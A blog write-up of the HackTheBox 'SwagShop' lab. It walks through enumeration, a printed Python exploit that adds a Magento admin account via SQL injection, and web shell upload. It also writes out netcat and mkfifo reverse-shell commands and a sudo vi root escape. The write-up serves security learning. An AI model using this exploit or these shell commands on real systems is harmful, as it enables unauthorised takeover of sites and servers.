---
layout: post
title:  "Hackthebox - Swagshop write-up"
date:   2019-10-14 10:25:00 +0200
categories: Hackthebox
---

## Introduction

![](https://i.imgur.com/ovX598s.png)

SwagShop, which appeared on HackTheBox on 2019/05/12, is a fun and easy GNU/Linux box. It contains an ecommerce shop running on an old/unpatched version of Magento which has some known and ready-to-use exploits. The path is quite straightforward, after some initial enumeration we can gain access to the admin panel, upload a reverse shell, get user.txt and root.txt in a couple of minutes.

## Enumeration

We can start by enumerating the services running on the machine, which is located at 10.10.10.140

```
chap@box~ > nmap -sV 10.10.10.140

Starting Nmap 7.60 ( https://nmap.org ) at 2019-05-22 10:32 CEST
Nmap scan report for 10.10.10.140
Host is up (0.099s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds
```

As we can see, the machine is only exposing ssh and Apache. Taking a look to the website seems the most reasonable thing to do so let’s move to the web browser.

## Web pages

Going to http://10.10.10.140 leds us to an ecommerce store running on Magento and containing a couple of products. From what we can see, the pages are dated 2014, making us think that the Magento version used is quite old and probably unpatched.
While taking a look at all the pages we can also fire up gobuster in order to do some enumeration using [SecLists’ wordlists](https://github.com/danielmiessler/SecLists).

```
chap@box ~/S/D/Web-Content> gobuster -u "10.10.10.140" -w common.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.140/
[+] Threads      : 10
[+] Wordlist     : common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/15 00:00:11 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/app (Status: 301)
/downloader (Status: 301)
/errors (Status: 301)
/favicon.ico (Status: 200)
/includes (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/lib (Status: 301)
/media (Status: 301)
/pkginfo (Status: 301)
/server-status (Status: 403)
/shell (Status: 301)
/skin (Status: 301)
/var (Status: 301)
=====================================================
2019/05/15 00:00:52 Finished
=====================================================
```

The scan pokes us with a couple of interesting pages, while taking a look at all of them we stumble upon http://10.10.10.140/downloader/ which contains the login panel of **Magento connect manager**, Magento’s original marketplace for extensions.

![](https://i.imgur.com/EOAwSMQ.png)

As we can see, the version running is **1.9.0.0**. By making a rapid search on Exploit database, we discover this version has a [known exploit](https://www.exploit-db.com/exploits/37977).

## Exploitation

The Python exploit needs to be tailored a little in order to fit our needs.

```
import requests
import base64
import sys

target = "http://target.com/"

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "downloader"

q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""


query = q.replace("\n", "").format(username="user", password="password")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url, 
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter),
                        "forwarded": 1})
if r.ok:
    print "WORKED"
    print "Check {0}/downloader/ with creds user:password".format(target)
else:
    print "DID NOT WORK"
```

This is the modified version of the Python exploit, the original one can be found on Exploit database.

Once we run the exploit, we can log in using user:password as credentials.

From this panel, we can upload/install Magento extensions as well as have access to the administrator panel. I decided to try and upload [Magpleasure Filesystem extension](https://magentary.com/glossary/magpleasurefilesystem-extension/) in order to modify a .php file and upload a reverse shell.

After uploading the extension we can use the “Return to Admin” button in order to take advantage of our newly uploaded extension. Back to the Administrator panel we can now go to System > Filesystem > IDE and use our integrated IDE. The file targeted with an uploader is http://10.10.10.140/get.php using a slightly modified version of [this basic uploader](https://gist.githubusercontent.com/taterbase/2688850/raw/b9d214c9cbcf624e13c825d4de663e77bf38cc14/upload.php).

![](https://i.imgur.com/BPt3q2E.png)

Using our basic uploader we can upload and use [SecLists’ cmd-simple reverse shell](https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/FuzzDB/cmd-simple.php) and launch a couple of basic commands straight from our address bar.

After a couple of ls and cat we get to http://10.10.10.140/app/cmd-simple.php?cmd=cat+/home/haris/user.txt which contains the hash ```a448877277e82f05e5ddf9f90aefbac8``` needed to own user.

![](https://i.imgur.com/USTlH5S.png)

We still need a fully working reverse shell before getting root. We try to spawn one using the classic netcat method,  starting a listener on ```nc -lvnp [PORT]``` and launching ```nc -e /bin/sh [IPADDR] [PORT]``` from our uploaded shell. This method seems to not work at all, probably because this version of nc doesn’t support the ```-e``` parameter needed to execute commands after connecting.

Second shot is

```
rm /tmp/shell;mkfifo /tmp/shell;cat /tmp/shell|/bin/sh -i 2>&1|nc [IPADDR[ [PORT] >/tmp/shell
```

[This method](https://onofri.org/security/%ef%bb%bfpenetration-testing-ottenere-shell-e-tty-su-linux/#more-191) works and gets us a fully working reverse shell.

Running ```sudo -l``` shows us the commands we can run and the folders we have write access to as ```www-data``` (we are logged in as www-data, the Apache user). 
From this step, getting root is quite simple. The command:

```
sudo /usr/bin/vi /var/www/html/root.sh
```

Allows us to run ```vi``` as ```root``` in ```/var/www/html/``` and to launch a root shell by typing ```:!bash``` inside vi. After that, ```cat /root/root.txt``` gets the job done.

![](https://i.imgur.com/DA8zEiq.png)
